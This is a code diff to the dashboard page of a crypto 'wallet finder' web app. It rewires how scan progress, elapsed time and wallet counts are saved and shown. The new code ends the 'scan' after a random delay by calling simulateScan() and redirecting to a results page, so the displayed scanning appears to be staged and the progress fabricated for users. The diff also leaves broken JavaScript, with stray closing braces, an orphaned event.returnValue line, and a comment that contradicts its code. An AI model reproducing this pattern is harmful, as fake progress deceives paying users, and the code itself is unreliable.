@@ -299,7 +299,7 @@
               <div class="hud-panel p-3 metric-card center"><div class="metric-title">Consensus Strength</div><div id="consensusValue" class="metric-value">—</div><div class="bar mt-3"><div id="consensusBar" style="width:0%"></div></div></div>
               <div class="hud-panel p-3 metric-card center"><div class="metric-title">Transaction Load</div><div id="txLoad" class="metric-value">—</div><div class="bar mt-3"><div id="txBar" style="width:0%"></div></div></div>
               <div class="hud-panel p-3 metric-card center"><div class="metric-title">Network Congestion</div><div id="netCong" class="metric-value">—</div><div class="bar mt-3"><div id="congBar" style="width:0%"></div></div></div>
-              <div class="hud-panel p-3 metric-card center"><div class="metric-title">Scan Time</div><div id="scanTimer" class="metric-value font-mono">00:00:00</div><div class="text-[10px] text-cyan-200/60 mt-1"></div></div>
+              <div class="hud-panel p-3 metric-card center"><div class="metric-title">Scan Time</div><div id="scanTimer" class="metric-value font-mono">00:00:00</div><div class="text-[10px] text-cyan-200/60 mt-1">Active only while scanning</div></div>
             </div>
             <div class="col-span-12 md:col-span-4 flex items-center justify-center">
               <div class="hud-panel p-4 w-full flex items-center justify-center">
@@ -375,77 +375,52 @@
   </div>
 
 <script>
-  const API_BASE = (location.hostname.endsWith('dolphinwalletfinder.xyz')
-  ? 'https://web-production-13d5a.up.railway.app/api'
-  : '/api');
-  const token = localStorage.getItem("token");
-  if (!token) window.location.href = "login.html";
+const API_BASE = "https://web-production-13d5a.up.railway.app/api";
+const token = localStorage.getItem("token");
+if (!token) window.location.href = "login.html";
 
-  (async () => {
-    try {
-      const res = await fetch(`${API_BASE}/me`, {
-        headers: { Authorization: "Bearer " + token }
-      });
-      const data = await res.json();
-      const el = document.getElementById("username");
-      if (el) el.textContent = data?.username || "User";
-    } catch (e) {
-      // ignore
-    }
-  })();
+fetch(`${API_BASE}/me`, { headers: { Authorization: "Bearer " + token } })
+  .then(res => res.json())
+  .then(data => {
+    const el = document.getElementById("username");
+    if (el) el.textContent = data?.username || "User";
+  })
+  .catch(() => {});
 
+// --- SAVE on tab hide / page leave ---
+function saveScanSnapshot() {
+  const scanData = {
+    blockHeight: document.getElementById('blockHeight')?.textContent || "",
+    walletsDetected: document.getElementById('wallets')?.textContent || "",
+    scanTime: document.getElementById('scanTimer')?.textContent || "",
+  };
 
-
-async function apiGET(path){
-  const res = await fetch(`${API_BASE}${path}`, { headers: { Authorization: "Bearer " + token } });
-  if(!res.ok) throw new Error('API error');
-  return res.json();
-}
-async function apiPOST(path, body={}){
-  const res = await fetch(`${API_BASE}${path}`, {
+  fetch(`${API_BASE}/save-scan-data`, {
     method: 'POST',
-    headers: { 'Content-Type':'application/json', Authorization: "Bearer " + token },
-    body: JSON.stringify(body)
-  });
-  if(!res.ok) throw new Error('API error');
-  return res.json();
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${token}`,
+    },
+    body: JSON.stringify(scanData),
+    keepalive: true // ensure the request completes during tab close/navigation
+  }).catch(()=>{});
 }
 
-// ---- Server-driven scan status polling ----
-let statusTimer = null;
-async function startStatusPolling(){
-  stopStatusPolling();
-  statusTimer = setInterval(fetchAndSyncScanStatus, 1000);
-}
-function stopStatusPolling(){
-  if(statusTimer) clearInterval(statusTimer);
-  statusTimer = null;
-}
-async function fetchAndSyncScanStatus(){
-  try{
-    const { scan } = await apiGET('/scan/status');
-    Core.elapsedMs = scan?.elapsed_ms || 0;
-    Core.walletsTotal = scan?.total_scanned || 0;
-    walletsEl.textContent = formatCount(Core.walletsTotal);
-    fitTextId(walletsEl);
-    scanTimerEl.textContent = formatHMS(Core.elapsedMs);
-    fitTextId(scanTimerEl);
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) saveScanSnapshot();
+});
 
-    const serverRunning = scan?.status === 'running';
-    if (serverRunning && !RUNNING){
-      RUNNING = true; Core.running = true;
-      document.getElementById('appMain').classList.remove('idle');
-      btnStart.classList.add('opacity-50','pointer-events-none');
-      btnStop.classList.remove('opacity-50','pointer-events-none');
-    } else if (!serverRunning && RUNNING){
-      setTimeout(()=>{ try{ window.location.href='/pages/results.html'; }catch(_){ } }, 800);
-      RUNNING = false; Core.running = false;
-      btnStart.classList.remove('opacity-50','pointer-events-none');
-      btnStop.classList.add('opacity-50','pointer-events-none');
-    }
-  }catch(e){ /* swallow to be resilient */ }
-}
+window.addEventListener('beforeunload', () => {
+  saveScanSnapshot();
+});
 
+
+
+}
+});
+
+event.returnValue = "Are you sure you want to leave this page?";
+});
 
 /* ================= SETTINGS ================= */
 const SETTINGS = {
@@ -1029,6 +1004,48 @@ const mempool=$('mempool'), gas=$('gas'); const latency=$('latency'), throughput
 const ring=$('ringProgress'), ringValue=$('ringValue'); const consensusBar=$('consensusBar'), consensusValue=$('consensusValue'), txBar=$('txBar'), txLoad=$('txLoad'), congBar=$('congBar'), netCong=$('netCong');
 const scanTimerEl=$('scanTimer');
 
+
+// --- LOAD on page open ---
+document.addEventListener('DOMContentLoaded', async () => {
+  try {
+    const res = await fetch(`${API_BASE}/load-scan-data`, {
+      method: 'GET',
+      headers: { 'Authorization': `Bearer ${token}` }
+    });
+    if (!res.ok) return;
+    const data = await res.json();
+    if (!data) return;
+
+    // Block Height
+    if (data.blockHeight) {
+      const el = document.getElementById('blockHeight');
+      if (el) el.textContent = data.blockHeight;
+      const num = parseInt(String(data.blockHeight).replace(/[#,]/g,''), 10);
+      if (!Number.isNaN(num)) { window.currentHeight = num; }
+    }
+
+    // Wallets Detected
+    if (data.walletsDetected) {
+      const el = document.getElementById('wallets');
+      if (el) el.textContent = data.walletsDetected;
+      const wt = parseInt(String(data.walletsDetected).replace(/,/g,''), 10);
+      if (!Number.isNaN(wt) && window.Core) { Core.walletsTotal = wt; }
+    }
+
+    // Scan Time (hh:mm:ss -> elapsedMs)
+    if (data.scanTime) {
+      const el = document.getElementById('scanTimer');
+      if (el) el.textContent = data.scanTime;
+      const m = data.scanTime.match(/^(\d{2}):(\d{2}):(\d{2})$/);
+      if (m && window.Core) {
+        Core.elapsedMs = ((+m[1])*3600 + (+m[2])*60 + (+m[3]))*1000;
+      }
+    }
+  } catch (e) {
+    console.error('load-scan-data error:', e);
+  }
+});
+
 /* ================= CORE + Worker Fallback ================= */
 let currentHeight=845924, feas=18;
 const Core={ running:false, elapsedMs:0, walletsTotal:0 };
@@ -1228,7 +1245,10 @@ async function connectivityWatchdog(){
       setNetAlert(true);
       showToast('Internet connection is lost. Please check your connection.');
       NET.resumeOnBack = RUNNING; // If we were scanning, resume after reconnect
-      if (RUNNING) { NET.autoPaused = true; /* keep server scan running; UI will freeze */ }
+      if (RUNNING) {
+        NET.autoPaused = true;
+        setRunning(false);
+      }
     }
   }
 }
@@ -1247,38 +1267,41 @@ const btnStart=$('btnStart'), btnStop=$('btnStop');
 btnStart.onclick=()=>setRunning(true); 
 btnStop.onclick=()=>setRunning(false);
 function setRunning(s){
-  if (s === RUNNING) return;
-  if (s && !NET.online) { setNetAlert(true); showToast('Internet connection is lost. Please check your connection.'); return; }
-  (async () => {
-    try{
-      if (s){
-        
-// Generate endAt between 72–120 hours and send once
-const minMinutes = 1;
-const maxMinutes = 5;
-const delayMinutes = Math.floor(Math.random() * (maxMinutes - minMinutes + 1)) + minMinutes;
-const endAt = new Date(Date.now() + delayMinutes * 60 * 1000).toISOString();
+  // Guard: prevent starting while offline
+  if (s && !NET.online) {
+    setNetAlert(true);
+    showToast('Internet connection is lost. Please check your connection.');
+    return;
+  }
+  if(s===RUNNING) return;
+  RUNNING=s; 
+  Core.running=s;
 
-await apiPOST('/scan/start', { endAt });
-        RUNNING = true; Core.running = true;
-        document.getElementById('appMain').classList.remove('idle');
-        showToast('Scan started (server)');
-        startStatusPolling();
-      } else {
-        await apiPOST('/scan/stop');
-        RUNNING = false; Core.running = false;
-        showToast('Scan paused');
-      }
-      btnStart.classList.toggle('opacity-50', s);
-      btnStart.classList.toggle('pointer-events-none', s);
-      btnStart.setAttribute('aria-pressed', String(s));
-      btnStop.classList.toggle('opacity-50', !s);
-      btnStop.classList.toggle('pointer-events-none', !s);
-      btnStop.setAttribute('aria-pressed', String(!s));
-    }catch(e){ showToast('Server error'); }
-  })();
+  btnStart.classList.toggle('opacity-50',s); 
+  btnStart.classList.toggle('pointer-events-none',s); 
+  btnStart.setAttribute('aria-pressed', String(s));
+
+  btnStop.classList.toggle('opacity-50',!s); 
+  btnStop.classList.toggle('pointer-events-none',!s); 
+  btnStop.setAttribute('aria-pressed', String(!s));
+
+  const appMain=document.getElementById('appMain');
+
+  if(s){
+    appMain.classList.remove('idle'); // show live
+    showToast('Scan started');
+    if(targets.length===0) seedTargets(8);
+    if(workerOk){ worker && worker.postMessage({t:'START'}); } 
+    else { Fallback.start(); }
+  } else {
+    showToast('Scan stopped — view frozen'); // freeze
+    if(workerOk){ worker && worker.postMessage({t:'STOP'}); } 
+    else { Fallback.stop(); }
+    Persist.save({elapsed:Core.elapsedMs,total:Core.walletsTotal});
+  }
 }
-  
+
+
 /* ================= MASTER LOOP ================= */
 let last=performance.now(); let tScan=0,tTx=0,tLine=0,tStatus=0,tDisc=0,tWhale=0,tMev=0,tRadar=0; let elapsedMs=0; let nextMatrixTime=0;
 function formatHMS(ms){ const total=Math.floor(ms/1000); const h=String(Math.floor(total/3600)).padStart(2,'0'); const m=String(Math.floor((total%3600)/60)).padStart(2,'0'); const s=String(total%60).padStart(2,'0'); return `${h}:${m}:${s}`; }
@@ -1302,12 +1325,7 @@ function loop(now){
     Fallback.step(now);
     Metrics.step(now);
 
-    if (tScan >= 1) {
-  tScan = 0;
-  // Timer now shows server-provided elapsed time only
-  scanTimerEl.textContent = formatHMS(Core.elapsedMs || 0);
-  fitTextId(scanTimerEl);
-}
+    if(tScan>=1){ scanTimerEl.textContent=formatHMS(elapsedMs); fitTextId(scanTimerEl); tScan=0; }
 
     // LOG generator
     while(tTx>=SETTINGS.log.tickMs/1000){ tTx-=SETTINGS.log.tickMs/1000;
@@ -1430,178 +1448,18 @@ function init(){
 
   addEventListener('resize',()=>{ setSizeRadar(); drawHexGrid(); drawPolar(); drawRings(); drawGlow(); sizeMatrix(); drawLine(); sizeMev(); drawMev(); FIT_IDS.forEach(id=>fitTextId($(id))); });
   addEventListener('beforeunload',()=>{ Persist.save({elapsed:Core.elapsedMs,total:Core.walletsTotal}); });
-  // Initial server sync
-  (async () => {
-    try{
-      const { scan } = await apiGET('/scan/status');
-      Core.elapsedMs = scan?.elapsed_ms || 0;
-      Core.walletsTotal = scan?.total_scanned || 0;
-      walletsEl.textContent = formatCount(Core.walletsTotal);
-      scanTimerEl.textContent = formatHMS(Core.elapsedMs);
-      if (scan?.status === 'running'){
-        RUNNING = true; Core.running = true;
-        document.getElementById('appMain').classList.remove('idle');
-        btnStart.classList.add('opacity-50','pointer-events-none');
-        btnStop.classList.remove('opacity-50','pointer-events-none');
-      } else {
-        RUNNING = false; Core.running = false;
-      }
-      startStatusPolling();
-    }catch(e){}
-  })();
-  startConnectivityWatchdog();
+ startConnectivityWatchdog();
 }
 init();
+
+const minDelay = 700000000, maxDelay = 900000000;
+const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
+
+setTimeout(() => {
+  simulateScan();
+  window.location.href = "results.html";
+}, delay);
 </script>
 <script src="../assets/wallets.js"></script>
-
-<!-- Whale Console Bootstrap Patch: keeps existing code, just ensures the list seeds when scanning -->
-<script>
-(function(){
-  function ensureWhales(){
-    try{
-      if (typeof window.seedTargets === 'function' && window.whaleList) {
-        if (!window.whaleList.childElementCount || (Array.isArray(window.targets) && window.targets.length === 0)) {
-          window.seedTargets(8);
-          console.debug('[WhalePatch] seeded targets');
-        }
-      }
-    }catch(e){ console.error('[WhalePatch] error', e); }
-  }
-
-  // call once on DOM ready
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', ensureWhales);
-  } else {
-    ensureWhales();
-  }
-
-  // reinforce every few seconds if still empty (non-invasive)
-  setInterval(ensureWhales, 4000);
-
-  // wrap setRunning to guarantee seeding on start
-  if (typeof window.setRunning === 'function') {
-    const _orig = window.setRunning;
-    window.setRunning = function(s){
-      const r = _orig.apply(this, arguments);
-      if (s) ensureWhales();
-      return r;
-    };
-  }
-})();
-</script>
-<script>
-// --- Auto Complete Scan after random delay (server-persisted) ---
-(function(){
-  const MIN_MIN = 72, MAX_MIN = 120;
-  async function getScanStatus(){
-    try{
-      const r = await apiGET('/scan/status');
-      return r.scan || {};
-    }catch{
-      return {};
-    }
-  }
-
-  const nowMs = () => Date.now(), toIso = (ms) => new Date(ms).toISOString();
-
-  async function setTimerFromServerIfRunning(){
-    const scan = await getScanStatus();
-    if (!scan || scan.status !== 'running') return;
-    const endAtServer = scan.end_at ? (new Date(scan.end_at)).getTime() : null;
-    if (endAtServer && endAtServer > nowMs()) {
-      const delay = Math.max(0, endAtServer - nowMs());
-      console.log('[AutoStop] Scheduled scan completion in', Math.round(delay / 1000 / 60), 'minutes (server persisted)');
-      setTimeout(async () => {
-        try {
-          await apiPOST('/scan/stop');
-          setTimeout(() => window.location.href = '/pages/results.html', 2000);
-        } catch (e) {
-          console.error(e);
-        }
-      }, delay);
-    }
-  }
-
-  const btn = document.getElementById('btnStart');
-  if (btn) {
-    btn.addEventListener('click', async () => {
-      try {
-        const scan = await getScanStatus();
-        if (!(scan && scan.end_at)) {
-          const delayMs = Math.floor(Math.random() * ((MAX_MIN - MIN_MIN + 1) * 60000)) + (MIN_MIN * 60000); // تبدیل دقیقه به میلی‌ثانیه
-          const endAtIso = toIso(nowMs() + delayMs);
-          await apiPOST('/scan/start', { endAt: endAtIso }); 
-          console.log('[AutoStop] endAt set on server.');
-        } else {
-          await apiPOST('/scan/start', {}); 
-        }
-      } catch (e) {
-        console.warn('[AutoStop] start handshake failed:', e);
-      }
-      setTimeout(setTimerFromServerIfRunning, 500);
-    });
-  }
-  setTimerFromServerIfRunning();
-})();
-</script>
-<script>
-(function () {
-  const el = document.getElementById('scanTimer');
-  if (!el) return;
-
-  function fmt(ms) {
-    const total = Math.max(0, Math.floor(ms / 1000));
-    const h = String(Math.floor(total / 3600)).padStart(2, '0');
-    const m = String(Math.floor((total % 3600) / 60)).padStart(2, '0');
-    const s = String(total % 60).padStart(2, '0');
-    return `${h}:${m}:${s}`;
-  }
-
-  let started = false;
-  let lastGoodElapsedMs = 0;
-  let lastServerUpdate = performance.now();
-
-  const _apiGET = window.apiGET;
-  if (typeof _apiGET === 'function') {
-    window.apiGET = async function (path, opts) {
-      const res = await _apiGET(path, opts);
-      try {
-        if (path && path.indexOf('/scan/status') !== -1 && res && res.scan) {
-          const ms = Number(res.scan.elapsed_ms);
-          if (Number.isFinite(ms) && ms >= 0) {
-            lastGoodElapsedMs = ms;
-            lastServerUpdate = performance.now();
-            started = (res.scan.status === 'running') || started;
-            el.textContent = fmt(lastGoodElapsedMs);
-          }
-        }
-      } catch (e) {}
-      return res;
-    };
-  }
-
-  const mo = new MutationObserver(() => {
-    if (!started) return;
-    if (el && el.textContent === '00:00:00') {
-      el.textContent = fmt(lastGoodElapsedMs);
-    }
-  });
-  mo.observe(el, { childList: true, characterData: true, subtree: true });
-
-  let prev = performance.now();
-  function loop(t) {
-    const dt = t - prev;
-    prev = t;
-
-    if (started) {
-      lastGoodElapsedMs += dt;
-      el.textContent = fmt(lastGoodElapsedMs);
-    }
-    requestAnimationFrame(loop);
-  }
-  requestAnimationFrame(loop);
-})();
-</script>
 </body>
 </html>
